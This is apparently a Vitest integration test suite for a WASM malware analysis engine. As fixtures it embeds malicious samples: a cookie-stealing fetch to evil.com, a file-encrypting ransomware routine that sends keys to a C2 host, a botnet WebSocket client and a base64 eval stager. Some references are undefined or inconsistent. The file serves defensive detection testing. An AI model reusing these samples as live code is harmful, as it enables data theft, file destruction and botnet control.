import { describe, it, expect, beforeAll } from 'vitest';
import { 
  initializeAnalysisEngine,
  CryptoBridge,
  NetworkBridge,
  createFileProcessor,
  initializeSandbox,
  executeInSandbox,
  analysisEngine
} from '../../bridge';
import { getPatternMatcher } from '../../bridge/pattern-matcher-bridge';
import { deobfuscate } from '../../bridge/deobfuscator-bridge';

// Initialize all WASM modules
async function initializeWASMModules() {
  await initializeAnalysisEngine();
  await initializeSandbox();
  // Other modules initialize on first use
}

describe('Phase 3 Complete Integration Tests', () => {
  beforeAll(async () => {
    // Initialize all WASM modules
    await initializeWASMModules();
  }, 30000);

  describe('End-to-End Security Analysis', () => {
    it('should analyze a malicious JavaScript file with all modules', async () => {
      // 1. Create a test malicious JavaScript file
      const maliciousCode = `
        // Obfuscated malware sample
        var _0x4b22=['log','Hello\x20World'];
        (function(_0x2d8f05,_0x4b2211){
          var _0x2d8f=function(_0x4b22){
            while(--_0x4b22){
              _0x2d8f05['push'](_0x2d8f05['shift']());
            }
          };
          _0x2d8f(++_0x4b2211);
        }(_0x4b22,0x1eb));
        var _0x2d8f=function(_0x2d8f05,_0x4b2211){
          _0x2d8f05=_0x2d8f05-0x0;
          var _0x2d8f05=_0x4b22[_0x2d8f05];
          return _0x2d8f05;
        };
        // Suspicious network activity
        fetch('http://evil.com/steal?data=' + document.cookie);
        // Crypto mining
        var miner = new CryptoMiner();
        miner.start();
      `;

      // 2. Process file with file processor
      const fileProcessor = await createFileProcessor();
      const fileBuffer = new TextEncoder().encode(maliciousCode).buffer;
      const fileAnalysis = await fileProcessor.parseFile(fileBuffer, 'javascript');
      expect(fileAnalysis).toBeDefined();
      const suspiciousPatterns = await fileProcessor.extractSuspiciousPatterns(maliciousCode);
      expect(suspiciousPatterns.length).toBeGreaterThan(0);

      // 3. Deobfuscate the code
      const deobfuscated = await deobfuscate(maliciousCode);
      expect(deobfuscated).toBeDefined();
      expect(deobfuscated.deobfuscated).toContain('Hello World');

      // 4. Pattern matching for malicious patterns
      const patternMatcher = new PatternMatcherBridge();
      await patternMatcher.initialize();
      const patterns = await patternMatcher.scan(new TextEncoder().encode(deobfuscated.deobfuscated).buffer);
      expect(patterns.success).toBe(true);
      expect(patterns.data.matches).toContainEqual(
        expect.objectContaining({
          pattern: expect.stringContaining('cookie'),
          severity: 'high'
        })
      );

      // 5. Sandbox execution analysis
      await initializeSandbox();
      const sandboxResult = await executeInSandbox(maliciousCode);
      expect(sandboxResult.success).toBe(true);
      expect(sandboxResult.networkAttempts).toBeGreaterThan(0);
      expect(sandboxResult.suspiciousBehaviors).toContainEqual(
        expect.stringContaining('network access')
      );

      // 6. Network traffic analysis (simulated)
      const networkBridge = NetworkBridge.getInstance();
      const networkCapture = {
        packets: [{
          timestamp: Date.now(),
          length: 100,
          sourceIP: '192.168.1.100',
          destIP: '203.0.113.50', // evil.com
          protocol: 6,
          data: new TextEncoder().encode('GET /steal?data=sessionid HTTP/1.1')
        }],
        startTime: Date.now(),
        endTime: Date.now() + 1000,
        totalPackets: 1,
        totalBytes: 100
      };
      
      const networkAnalysis = await networkBridge.analyzeNetworkCapture(networkCapture);
      expect(networkAnalysis.suspiciousActivities).toBeGreaterThan(0);
      expect(networkAnalysis.riskScore).toBeGreaterThan(50);

      // 7. Crypto analysis for mining detection
      const cryptoBridge = CryptoBridge.getInstance();
      const hashPattern = await cryptoBridge.detectCryptoPatterns(
        new TextEncoder().encode(maliciousCode)
      );
      expect(hashPattern.includes('mining')).toBe(true);

      // 8. Final analysis engine verdict
      const analysisEngine = await initializeAnalysisEngine();
      const finalAnalysis = await analysisEngine.analyzeCode(maliciousCode, 'javascript');
      expect(finalAnalysis.success).toBe(true);
      expect(finalAnalysis.data.riskLevel).toBe('high');
      expect(finalAnalysis.data.threats).toContain('obfuscation');
      expect(finalAnalysis.data.threats).toContain('data-exfiltration');
      expect(finalAnalysis.data.threats).toContain('crypto-mining');
    });

    it('should analyze a ransomware sample across all modules', async () => {
      const ransomwareCode = `
        // Ransomware simulation
        const crypto = require('crypto');
        const fs = require('fs');
        
        function encryptFile(filepath) {
          const algorithm = 'aes-256-cbc';
          const key = crypto.randomBytes(32);
          const iv = crypto.randomBytes(16);
          
          const input = fs.createReadStream(filepath);
          const output = fs.createWriteStream(filepath + '.encrypted');
          const cipher = crypto.createCipheriv(algorithm, key, iv);
          
          input.pipe(cipher).pipe(output);
          
          // Send key to C2 server
          fetch('https://c2.evil.com/keys', {
            method: 'POST',
            body: JSON.stringify({ key: key.toString('hex'), file: filepath })
          });
        }
        
        // Scan and encrypt all files
        const path = require('path');
        function scanDirectory(dir) {
          fs.readdirSync(dir).forEach(file => {
            const fullPath = path.join(dir, file);
            if (fs.statSync(fullPath).isDirectory()) {
              scanDirectory(fullPath);
            } else {
              encryptFile(fullPath);
            }
          });
        }
        
        scanDirectory('/home/user/documents');
      `;

      // Multi-module analysis
      const fileProcessor = createFileProcessor();
      const patternMatcher = getPatternMatcher();
      await patternMatcher.initialize();
      const cryptoBridge = CryptoBridge.getInstance();

      // File analysis
      const fileBuffer = new TextEncoder().encode(ransomwareCode).buffer;
      const fileAnalysis = await fileProcessor.parseFile(fileBuffer, 'javascript');
      const suspiciousPatterns = await fileProcessor.extractSuspiciousPatterns(ransomwareCode);
      expect(suspiciousPatterns.length).toBeGreaterThan(0);

      // Pattern detection
      const patterns = await patternMatcher.scan(new TextEncoder().encode(ransomwareCode).buffer);
      const ransomwarePatterns = patterns.matches.filter(m => 
        m.rule_id.includes('encrypt') || m.rule_id.includes('ransom')
      );
      expect(ransomwarePatterns.length).toBeGreaterThan(0);

      // Crypto analysis - check if code contains crypto operations
      const hasCryptoOps = ransomwareCode.includes('aes-256-cbc') && ransomwareCode.includes('createCipheriv');
      expect(hasCryptoOps).toBe(true);

      // Final verdict
      const verdict = await analysisEngine.analyze(
        new TextEncoder().encode(ransomwareCode),
        'ransomware.js',
        'javascript'
      );
      expect(verdict.success).toBe(true);
      expect(verdict.threatLevel).toBeGreaterThanOrEqual(3);
    });

    it('should detect and analyze a botnet C2 communication', async () => {
      const c2Code = `
        // Botnet C2 communication
        class BotClient {
          constructor() {
            this.id = this.generateBotId();
            this.c2Server = 'wss://c2.darknet.onion/bot';
            this.heartbeatInterval = 60000; // 1 minute
          }
          
          generateBotId() {
            return 'BOT_' + Math.random().toString(36).substr(2, 9);
          }
          
          async connect() {
            this.ws = new WebSocket(this.c2Server);
            
            this.ws.onopen = () => {
              this.register();
              this.startHeartbeat();
            };
            
            this.ws.onmessage = (event) => {
              const command = JSON.parse(event.data);
              this.executeCommand(command);
            };
          }
          
          register() {
            this.send({
              type: 'register',
              id: this.id,
              os: navigator.platform,
              ip: this.getLocalIP()
            });
          }
          
          startHeartbeat() {
            setInterval(() => {
              this.send({ type: 'heartbeat', id: this.id });
            }, this.heartbeatInterval);
          }
          
          executeCommand(cmd) {
            switch(cmd.type) {
              case 'ddos':
                this.launchDDoS(cmd.target);
                break;
              case 'mine':
                this.startMining(cmd.pool);
                break;
              case 'steal':
                this.stealData(cmd.dataType);
                break;
            }
          }
        }
        
        new BotClient().connect();
      `;

      // Network pattern analysis
      const networkBridge = NetworkBridge.getInstance();
      const patternMatcher = getPatternMatcher();
      
      // Simulate C2 traffic pattern
      const c2Traffic = [];
      const baseTime = Date.now();
      
      // Generate beaconing traffic
      for (let i = 0; i < 10; i++) {
        c2Traffic.push({
          sourceIP: '192.168.1.100',
          destIP: '185.220.101.1', // Tor exit node
          sourcePort: 45000 + i,
          destPort: 443,
          protocol: 6,
          timestamp: baseTime + (i * 60000), // Every minute
          bytesSent: 256,
          bytesReceived: 512,
          duration: 1000
        });
      }

      // Convert to proper PacketAnalysis format
      const packets: PacketAnalysis[] = c2Traffic.map(t => ({
        packet_type: 'TCP',
        source_ip: t.sourceIP,
        dest_ip: t.destIP,
        source_port: t.sourcePort,
        dest_port: t.destPort,
        protocol: 'TCP',
        payload_size: t.bytesSent,
        flags: [],
        timestamp: t.timestamp
      }));
      
      const trafficPatterns = await networkBridge.analyzeTrafficPattern(packets);
      expect(trafficPatterns.length).toBeGreaterThan(0);
      // Check if any pattern indicates beaconing
      const beaconingPattern = trafficPatterns.find(p => p.pattern_type === 'beaconing');
      expect(beaconingPattern).toBeDefined();

      // Pattern detection
      await patternMatcher.initialize();
      const patterns = await patternMatcher.scan(new TextEncoder().encode(c2Code).buffer);
      const c2Patterns = patterns.matches.filter(m =>
        m.severity === 'critical' && 
        (m.rule_id.includes('botnet') || m.rule_id.includes('c2'))
      );
      expect(c2Patterns.length).toBeGreaterThan(0);

      // Sandbox detection
      await initializeSandbox();
      const sandboxResult = await executeInSandbox(new TextEncoder().encode(c2Code));
      expect(sandboxResult.success).toBe(true);
      expect(sandboxResult.securityEvents.length).toBeGreaterThan(0);
      const wsEvents = sandboxResult.securityEvents.filter(e => 
        e.details && e.details.includes('websocket')
      );
      expect(wsEvents.length).toBeGreaterThan(0);
    });
  });

  describe('Performance Benchmarks', () => {
    it('should process large files efficiently', async () => {
      const largeFile = 'x'.repeat(1024 * 1024); // 1MB file
      const startTime = Date.now();
      
      const fileProcessor = getFileProcessor();
      const result = await fileProcessor.processLargeFile(
        new TextEncoder().encode(largeFile)
      );
      
      const processingTime = Date.now() - startTime;
      expect(result).toBeDefined();
      expect(processingTime).toBeLessThan(5000); // Should process in under 5 seconds
    });

    it('should handle concurrent module operations', async () => {
      const operations = [];
      
      // Launch multiple operations concurrently
      for (let i = 0; i < 10; i++) {
        operations.push(Promise.all([
          (async () => { const fp = createFileProcessor(); await fp.initialize(); return fp.parseFile(new TextEncoder().encode(`console.log(${i});`).buffer, 'javascript'); })(),
          (async () => { const pm = getPatternMatcher(); await pm.initialize(); return pm.scan(new TextEncoder().encode(`eval("code${i}")`).buffer); })(),
          CryptoBridge.getInstance().hash(new TextEncoder().encode(`data${i}`), { algorithm: 'sha256' }),
          NetworkBridge.getInstance().detectProtocol(new TextEncoder().encode(`HTTP/1.1 ${i}`))
        ]));
      }
      
      const results = await Promise.all(operations);
      expect(results).toHaveLength(10);
      results.forEach((result: any[]) => {
        expect(result).toHaveLength(4);
        result.forEach((r: any) => expect(r).toBeTruthy());
      });
    });
  });

  describe('Cross-Module Integration', () => {
    it('should share analysis context between modules', async () => {
      const suspiciousCode = `
        // Multi-stage attack
        const stage1 = atob('ZXZhbCgiYWxlcnQoMSkiKQ=='); // eval("alert(1)")
        eval(stage1);
        
        const payload = new Uint8Array([0xde, 0xad, 0xbe, 0xef]);
        crypto.subtle.encrypt(
          { name: "AES-GCM", iv: new Uint8Array(12) },
          key,
          payload
        );
      `;

      // Stage 1: Deobfuscation
      const deobResult = await deobfuscate(suspiciousCode);
      expect(deobResult.deobfuscated).toContain('eval("alert(1)")');

      // Stage 2: Pattern matching on deobfuscated code
      const patternMatcher = getPatternMatcher();
      await patternMatcher.initialize();
      const patterns = await patternMatcher.scan(new TextEncoder().encode(deobResult.deobfuscated).buffer);
      expect(patterns.matches).toBeDefined();
      const evalPatterns = patterns.matches.filter(m => 
        m.rule_id.includes('eval') && m.severity === 'high'
      );
      expect(evalPatterns.length).toBeGreaterThan(0);

      // Stage 3: Crypto analysis
      const cryptoBridge = CryptoBridge.getInstance();
      const hasAesGcm = deobResult.deobfuscated.includes('AES-GCM');
      expect(hasAesGcm).toBe(true);

      // Stage 4: Final analysis combining all findings
      const finalAnalysis = await analysisEngine.analyze(
        new TextEncoder().encode(suspiciousCode),
        'suspicious.js',
        'javascript'
      );
      
      expect(finalAnalysis.threats.length).toBeGreaterThan(0);
      expect(finalAnalysis.threatLevel).toBeGreaterThanOrEqual(3);
    });
  });

  describe('Security Hardening Verification', () => {
    it('should handle malformed inputs safely', async () => {
      const malformedInputs = [
        null,
        undefined,
        '',
        'a'.repeat(10 * 1024 * 1024), // 10MB string
        new Uint8Array(0),
        new Uint8Array([0xff, 0xfe]), // Invalid UTF-8
      ];

      for (const input of malformedInputs) {
        // All modules should handle invalid inputs gracefully
        try {
          if (typeof input === 'string' && input) {
            const fp = createFileProcessor();
            await fp.initialize();
            await fp.parseFile(new TextEncoder().encode(input).buffer, 'text');
          } else if (input instanceof Uint8Array && input.length > 0) {
            await CryptoBridge.getInstance().hash(input, { algorithm: 'sha256' });
          }
        } catch (error: unknown) {
          // Expected for invalid inputs
        }
      }
    });

    it('should enforce resource limits', async () => {
      // Test sandbox resource limits
      const infiniteLoop = `while(true) { console.log('loop'); }`;
      const result = await executeInSandbox(new TextEncoder().encode(infiniteLoop));
      expect(result.success).toBe(true);
      expect(result.exitCode).not.toBe(0); // Should timeout
      expect(result.executionTime).toBeLessThan(6000); // 5s limit + margin
    });

    it('should use secure random generation', async () => {
      const cryptoBridge = CryptoBridge.getInstance();
      
      // Generate multiple random values
      const randoms = [];
      for (let i = 0; i < 100; i++) {
        const key = cryptoBridge.generateAESKey(256);
        randoms.push(key);
      }
      
      // Check for uniqueness (no collisions)
      const uniqueKeys = new Set(randoms.map(k => k.toString()));
      expect(uniqueKeys.size).toBe(100);
      
      // Check entropy (simplified)
      const firstBytes = randoms.map(k => k[0]);
      const uniqueFirstBytes = new Set(firstBytes);
      expect(uniqueFirstBytes.size).toBeGreaterThan(50); // Good distribution
    });
  });
});

describe('Phase 3 Module Status', () => {
  it('should verify all 7 WASM modules are functional', async () => {
    const modules = [
      { name: 'Analysis Engine', test: () => analysisEngine },
      { name: 'File Processor', test: () => createFileProcessor() },
      { name: 'Pattern Matcher', test: () => getPatternMatcher() },
      { name: 'Deobfuscator', test: async () => { await deobfuscate('test'); return true; } },
      { name: 'Sandbox', test: async () => { await initializeSandbox(); return true; } },
      { name: 'Crypto', test: () => CryptoBridge.getInstance() },
      { name: 'Network', test: () => NetworkBridge.getInstance() }
    ];

    for (const module of modules) {
      try {
        const instance = await module.test();
        expect(instance).toBeTruthy();
        console.log(`✅ ${module.name}: Operational`);
      } catch (error: unknown) {
        console.error(`❌ ${module.name}: Failed - ${error}`);
        throw error;
      }
    }
    
    console.log('\n🎉 All 7 WASM modules are operational!');
    console.log('📊 Phase 3 Security Sandbox Implementation: COMPLETE');
  });
});